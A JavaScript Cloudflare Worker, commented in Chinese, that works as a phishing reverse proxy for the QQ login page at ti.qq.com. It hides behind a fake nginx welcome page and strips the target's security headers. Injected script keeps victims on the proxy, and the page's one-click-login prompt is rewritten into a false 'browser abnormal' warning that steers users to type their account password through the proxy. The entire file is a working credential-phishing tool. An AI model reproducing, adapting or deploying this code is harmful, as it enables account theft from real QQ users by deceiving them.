addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  thisProxyServerUrlHttps = `${url.protocol}//${url.hostname}/`;
  thisProxyServerUrl_hostOnly = url.host;
  event.respondWith(handleRequest(event.request));
});

const str = "/";
const lastVisitProxyCookie = "__PROXY_VISITEDSITE__";
const passwordCookieName = "__PROXY_PWD__";
const proxyHintCookieName = "__PROXY_HINT__";
const password = "";
const showPasswordPage = false;
const replaceUrlObj = "__location__yproxy__";

var thisProxyServerUrlHttps;
var thisProxyServerUrl_hostOnly;

// 注入的JavaScript代码，用于修改页面中的链接
const httpRequestInjection = `
var nowURL = new URL(window.location.href);
var proxy_host = nowURL.host;
var proxy_protocol = nowURL.protocol;
var proxy_host_with_schema = proxy_protocol + "//" + proxy_host + "/";
var original_website_url_str = window.location.href.substring(proxy_host_with_schema.length);
var original_website_url = new URL(original_website_url_str);

function changeURL(relativePath){
  if(relativePath == null) return null;
  
  var relativePath_str = "";
  if (relativePath instanceof URL) {
    relativePath_str = relativePath.href;
  } else {
    relativePath_str = relativePath.toString();
  }

  try {
    if(relativePath_str.startsWith("data:") || relativePath_str.startsWith("mailto:") || relativePath_str.startsWith("javascript:")) return relativePath_str;
  } catch(e) {
    return relativePath_str;
  }
  
  // 特殊处理：找回密码和新用户注册链接直接跳转到原网站
  if (relativePath_str.includes("accounts.qq.com/psw/find") || 
      relativePath_str.includes("ssl.zc.qq.com/phone/index.html")) {
    return relativePath_str;
  }
  
  // 特殊处理：跳过https://ui.ptlogin2.qq.com/cgi-bin/ssl/check
  if (relativePath_str.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
    return relativePath_str;
  }
  
  // 修改一键登录的文本
  if (relativePath_str.includes("ti.qq.com/qqlevel/index")) {
    // 这里将在服务器端处理文本替换
  }
  
  try {
    var absolutePath = new URL(relativePath_str, original_website_url_str).href;
    absolutePath = proxy_host_with_schema + absolutePath;
    return absolutePath;
  } catch (e) {
    return relativePath_str;
  }
}

// 网络请求注入
function networkInject(){
  var originalOpen = XMLHttpRequest.prototype.open;
  var originalFetch = window.fetch;
  
  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
    url = changeURL(url);
    return originalOpen.apply(this, arguments);
  };

  window.fetch = function(input, init) {
    var url;
    if (typeof input === 'string') {
      url = input;
    } else if (input instanceof Request) {
      url = input.url;
    } else {
      url = input;
    }
    
    url = changeURL(url);
    
    if (typeof input === 'string') {
      return originalFetch(url, init);
    } else {
      const newRequest = new Request(url, input);
      return originalFetch(newRequest, init);
    }
  };
}

// 元素属性注入
function elementPropertyInject(){
  const originalSetAttribute = HTMLElement.prototype.setAttribute;
  HTMLElement.prototype.setAttribute = function (name, value) {
    if (name == "src" || name == "href") {
      value = changeURL(value);
    }
    originalSetAttribute.call(this, name, value);
  };
}

// 修改location对象
class ProxyLocation {
  constructor(originalLocation) {
    this.originalLocation = originalLocation;
  }

  get href() {
    return original_website_url_str;
  }

  set href(url) {
    this.originalLocation.href = changeURL(url);
  }

  assign(url) {
    this.originalLocation.assign(changeURL(url));
  }

  replace(url) {
    this.originalLocation.replace(changeURL(url));
  }
}

function documentLocationInject(){
  Object.defineProperty(document, '${replaceUrlObj}', {
    get: function () {
      return new ProxyLocation(window.location);
    },  
    set: function (url) {
      window.location.href = changeURL(url);
    }
  });
}

function windowLocationInject() {
  Object.defineProperty(window, '${replaceUrlObj}', {
    get: function () {
      return new ProxyLocation(window.location);
    },
    set: function (url) {
      window.location.href = changeURL(url);
    }
  });
}

// 历史记录注入
function historyInject(){
  const originalPushState = History.prototype.pushState;
  const originalReplaceState = History.prototype.replaceState;

  History.prototype.pushState = function (state, title, url) {
    if(!url) return;
    var u = changeURL(url);
    return originalPushState.apply(this, [state, title, u]);
  };

  History.prototype.replaceState = function (state, title, url) {
    if(!url) return;
    var u = changeURL(url);
    return originalReplaceState.apply(this, [state, title, u]);
  };
}

// 遍历并转换所有元素的链接
function loopAndConvertToAbs(){
  for(var ele of document.querySelectorAll('*')){
    if(ele.hasAttribute('href')) {
      var href = ele.getAttribute('href');
      var newHref = changeURL(href);
      if (newHref !== href) {
        ele.setAttribute('href', newHref);
      }
    }
    if(ele.hasAttribute('src')) {
      var src = ele.getAttribute('src');
      var newSrc = changeURL(src);
      if (newSrc !== src) {
        ele.setAttribute('src', newSrc);
      }
    }
    if(ele.tagName === 'FORM' && ele.hasAttribute('action')) {
      var action = ele.getAttribute('action');
      var newAction = changeURL(action);
      if (newAction !== action) {
        ele.setAttribute('action', newAction);
      }
    }
  }
}

// 页面加载后的操作
window.addEventListener('load', () => {
  loopAndConvertToAbs();
  
  // 修改一键登录的文本
  var elements = document.querySelectorAll('*');
  elements.forEach(function(el) {
    if (el.textContent && el.textContent.includes('请安装最新版本的QQ手机版')) {
      el.textContent = el.textContent.replace('请安装最新版本的QQ手机版', '你的浏览器异常，请尝试使用账号密码登录');
    }
  });
});

// 执行注入
networkInject();
elementPropertyInject();
documentLocationInject();
windowLocationInject();
historyInject();
`;

const htmlCovPathInjectFuncName = "parseAndInsertDoc";
const htmlCovPathInject = `
function ${htmlCovPathInjectFuncName}(htmlString) {
  const parser = new DOMParser();
  const tempDoc = parser.parseFromString(htmlString, 'text/html');
  
  // 处理所有元素的链接
  const allElements = tempDoc.querySelectorAll('*');
  allElements.forEach(element => {
    if(element.hasAttribute('href')) {
      var href = element.getAttribute('href');
      var newHref = changeURL(href);
      if (newHref !== href) {
        element.setAttribute('href', newHref);
      }
    }
    if(element.hasAttribute('src')) {
      var src = element.getAttribute('src');
      var newSrc = changeURL(src);
      if (newSrc !== src) {
        element.setAttribute('src', newSrc);
      }
    }
    if(element.tagName === 'FORM' && element.hasAttribute('action')) {
      var action = element.getAttribute('action');
      var newAction = changeURL(action);
      if (newAction !== action) {
        element.setAttribute('action', newAction);
      }
    }
  });
  
  const modifiedHtml = tempDoc.documentElement.outerHTML;
  document.open();
  document.write('<!DOCTYPE html>' + modifiedHtml);
  document.close();
}
`;

// nginx欢迎页面
const nginxWelcomePage = `<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
body {
width: 35em;
margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif;
}
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p>For online documentation and support please refer to <a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"23706d89f379497d9a10994cbea3fda0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>`;

async function handleRequest(request) {
  const userAgent = request.headers.get('User-Agent') || '';
  
  // 如果是Bytespider爬虫，返回虚假信息
  if (userAgent.includes("Bytespider")) {
    return new Response("好不要脸，爬Wikipedia还要用我代理爬，说的就是你们Bytespider。", {
      headers: { "Content-Type": "text/plain" }
    });
  }

  const url = new URL(request.url);
  
  // 处理favicon.ico
  if (request.url.endsWith("favicon.ico")) {
    return Response.redirect("https://ti.qq.com/favicon.ico", 301);
  }
  
  // 处理robots.txt
  if (request.url.endsWith("robots.txt")) {
    return new Response(`User-Agent: *\nDisallow: /`, {
      headers: { "Content-Type": "text/plain" }
    });
  }

  // 如果访问根路径，返回nginx欢迎页面
  if (url.pathname === "/" || url.pathname === "") {
    return new Response(nginxWelcomePage, {
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
  }

  // 处理/qqlogin路径，代理到ti.qq.com
  var actualUrlStr;
  if (url.pathname.startsWith("/qq")) {
    // 代理到ti.qq.com
    actualUrlStr = "https://ti.qq.com/qqlevel/index" + url.pathname.substring(3) + url.search + url.hash;
  } else {
    // 其他路径直接返回404
    return new Response("Not Found", { status: 404 });
  }

  try {
    var actualUrl = new URL(actualUrlStr);
  } catch {
    return new Response("Invalid URL", { status: 400 });
  }

  // 特殊处理：跳过https://ui.ptlogin2.qq.com/cgi-bin/ssl/check
  if (actualUrlStr.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
    return Response.redirect(actualUrlStr, 302);
  }

  // 修改请求头
  let clientHeaderWithChange = new Headers();
  request.headers.forEach((value, key) => {
    var newValue = value.replaceAll(thisProxyServerUrlHttps, `${actualUrl.protocol}//${actualUrl.hostname}/`);
    newValue = newValue.replaceAll(thisProxyServerUrl_hostOnly, actualUrl.host);
    clientHeaderWithChange.set(key, newValue);
  });

  // 构造代理请求
  const modifiedRequest = new Request(actualUrl, {
    headers: clientHeaderWithChange,
    method: request.method,
    body: request.body,
    redirect: "manual"
  });

  // 获取响应
  const response = await fetch(modifiedRequest);
  
  // 处理重定向
  if (response.status.toString().startsWith("3") && response.headers.get("Location")) {
    try {
      const redirectUrl = new URL(response.headers.get("Location"), actualUrlStr).href;
      return Response.redirect(thisProxyServerUrlHttps + redirectUrl, 302);
    } catch {
      return new Response("Error while redirecting", { status: 500 });
    }
  }

  var modifiedResponse;
  var bd;
  const contentType = response.headers.get("Content-Type");
  var isHTML = false;

  if (response.body) {
    if (contentType && contentType.startsWith("text/")) {
      bd = await response.text();
      isHTML = (contentType && contentType.includes("text/html") && bd.includes("<html"));

      if (isHTML) {
        // 替换文本内容
        bd = bd.replace(/请安装最新版本的QQ手机版/g, '你的浏览器异常，请尝试使用账号密码登录');
        
        // 替换找回密码和新用户注册链接
        bd = bd.replace(/https:\/\/[^"']*accounts\.qq\.com\/psw\/find/g, 'https://accounts.qq.com/psw/find');
        bd = bd.replace(/https:\/\/[^"']*ssl\.zc\.qq\.com\/phone\/index\.html[^"']*/g, 'https://ssl.zc.qq.com/phone/index.html?from=pt');
        
        // 移除BOM
        var hasBom = false;
        if (bd.charCodeAt(0) === 0xFEFF) {
          bd = bd.substring(1);
          hasBom = true;
        }

        // 注入JavaScript代码
        var inject = `
        <!DOCTYPE html>
        <script>
        ${httpRequestInjection}
        ${htmlCovPathInject}
        
        const originalBody = \`${bd.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`;
        ${htmlCovPathInjectFuncName}(originalBody);
        </script>
        `;

        bd = (hasBom ? "\uFEFF" : "") + inject;
      } else {
        // 非HTML内容，替换链接
        bd = bd.replace(/https:\/\/ti\.qq\.com\//g, thisProxyServerUrlHttps + "https://ti.qq.com/");
      }

      modifiedResponse = new Response(bd, response);
    } else {
      modifiedResponse = new Response(response.body, response);
    }
  } else {
    modifiedResponse = new Response(response.body, response);
  }

  // 处理Cookie头
  let headers = modifiedResponse.headers;
  if (isHTML && response.status == 200) {
    let cookieValue = lastVisitProxyCookie + "=" + actualUrl.origin + "; Path=/; Domain=" + thisProxyServerUrl_hostOnly;
    headers.append("Set-Cookie", cookieValue);
  }

  // 设置跨域头
  headers.set('Access-Control-Allow-Origin', '*');
  headers.set("X-Frame-Options", "ALLOWALL");

  // 删除限制性Header
  var listHeaderDel = ["Content-Security-Policy", "Permissions-Policy", "Cross-Origin-Embedder-Policy", "Cross-Origin-Resource-Policy"];
  listHeaderDel.forEach(element => {
    headers.delete(element);
    headers.delete(element + "-Report-Only");
  });

  return modifiedResponse;
}

// 获取Cookie的函数
function getCook(cookiename, cookies) {
  var cookiestring = RegExp(cookiename + "=[^;]+").exec(cookies);
  return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : "");
}